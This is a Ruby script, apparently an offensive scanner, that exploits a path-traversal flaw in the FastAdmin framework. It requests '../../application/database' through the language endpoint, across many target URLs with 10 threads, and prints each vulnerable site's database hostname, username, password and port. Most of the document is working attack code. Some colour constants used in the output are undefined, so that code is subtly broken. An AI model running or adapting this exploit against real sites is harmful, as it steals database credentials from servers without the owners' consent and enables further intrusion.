require 'net/http'
require 'optparse'
require 'json'
require 'thread'
require 'uri'
require 'fileutils'

RESET_COLOR = "\033[39m"          
DIMMED_GRAY_COLOR = "\033[37m"   
HONEY_YELLOW_COLOR = "\033[93m"   
DIM_YELLOW_COLOR = "\033[33m"    
CYAN_COLOR = "\033[36m"          
GREEN_COLOR = "\033[32m"         
RED_COLOR = "\033[91m"            
LIGHT_ORANGE_COLOR = "\033[95m"   


THE_VERSION = "1.0.1"

PATHS_TO_CHECK = "/index/ajax/lang?lang=../../application/database"

LOG_DIR = 'logs'
LOG_FILE = File.join(LOG_DIR, 'scan.log')

def banner
  puts <<~BANNER
    #{LIGHT_ORANGE_COLOR}
    db.fastadmin
    #{RESET_COLOR}
  BANNER
end

def create_log_dir
  unless Dir.exist?(LOG_DIR)
    FileUtils.mkdir_p(LOG_DIR)
    print_message('info', "Log directory created: #{LOG_DIR}")
  end
end

def log_message(message)
  File.open(LOG_FILE, 'a') do |log_file|
    log_file.puts("#{Time.now.strftime('%Y-%m-%d %H:%M:%S')} - #{message}")
  end
end

def print_message(level, message)
  case level
  when 'vulnerable'
    puts "#{LIGHT_ORANGE_COLOR}[VLUN] #{message}#{RESET_COLOR}"
  when 'info'
    puts "#{DIMMED_GRAY_COLOR}[INFO] #{message}#{RESET_COLOR}"
  when 'warning'
    puts "#{CYAN_COLOR}[WARNING] #{message}#{RESET_COLOR}"
  when 'error'
    puts "#{RED_COLOR}[ERROR] #{message}#{RESET_COLOR}"
  end
  log_message(message)
end

def make_request(url)
  uri = URI.parse(url)
  request = Net::HTTP::Get.new(uri)
  response = Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == 'https', verify_mode: OpenSSL::SSL::VERIFY_NONE) do |http|
    http.request(request)
  end
  return response.body if response.code == '200'
rescue StandardError
  nil
end

def test_host(url)
  begin
    full_url = "#{url}#{PATHS_TO_CHECK}"
    body = make_request(full_url)
    if body && body.include?('jsonpReturn(')
      print_message('vulnerable', "#{url}")
      print_message('vulnerable', "Retrieving DB details for: #{url}")
      
      json_str = body.split('jsonpReturn(')[1].split(');')[0]
      data = JSON.parse(json_str)
      
      puts "#{DIMMED_YELLOW_COLOR}DB-Type: #{LIGHT_GREEN_COLOR}#{data['type'] || 'N/A'}#{RESET_COLOR}"
      puts "#{DIMMED_YELLOW_COLOR}Hostname: #{LIGHT_GREEN_COLOR}#{data['hostname'] || 'N/A'}#{RESET_COLOR}"
      puts "#{DIMMED_YELLOW_COLOR}Database: #{LIGHT_GREEN_COLOR}#{data['database'] || 'N/A'}#{RESET_COLOR}"
      puts "#{DIMMED_YELLOW_COLOR}Username: #{LIGHT_GREEN_COLOR}#{data['username'] || 'N/A'}#{RESET_COLOR}"
      puts "#{DIMMED_YELLOW_COLOR}Password: #{LIGHT_GREEN_COLOR}#{data['password'] || 'N/A'}#{RESET_COLOR}"
      puts "#{DIMMED_YELLOW_COLOR}hostport: #{LIGHT_GREENE_COLOR}#{data['hostport'] || 'N/A'}#{RESET_COLOR}"
    else
      print_message('warning', "Not Vulnerable: #{url}")
    end
  rescue StandardError => e
    print_message('error', "Error processing #{url}: #{e.message}")
  end
end

def worker(queue)
  until queue.empty?
    url = queue.pop(true) rescue nil
    if url
      print_message('info', "Testing #{url}")
      test_host(url)
    end
  end
end

def signal_handler
  print_message('error', 'You pressed Ctrl+C! Exiting.')
  exit(0)
end

def main
  Signal.trap("INT") { signal_handler }
  banner
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Usage: fastadmin_scanner.rb [options]"

    opts.on("-uURL", "--url=URL", "Target URL (e.g., http://example.com:8080)") do |url|
      options[:url] = url
    end

    opts.on("-fFILE", "--file=FILE", "File containing list of URLs (one per line)") do |file|
      options[:file] = file
    end
  end.parse!

  create_log_dir

  if options[:url]
    print_message('info', "Testing single target: #{options[:url]}")
    test_host(options[:url])
  elsif options[:file]
    urls = File.readlines(options[:file]).map(&:chomp)
    print_message('info', "Testing multiple targets from file: #{options[:file]}")

    queue = Queue.new
    urls.each { |url| queue << url }

    threads = Array.new(10) { Thread.new { worker(queue) } }
    threads.each(&:join)

    print_message('info', "Scanning complete.")
  else
    puts "No URL or file specified. Use -u or -f options."
  end
end

if __FILE__ == $0
  main
end
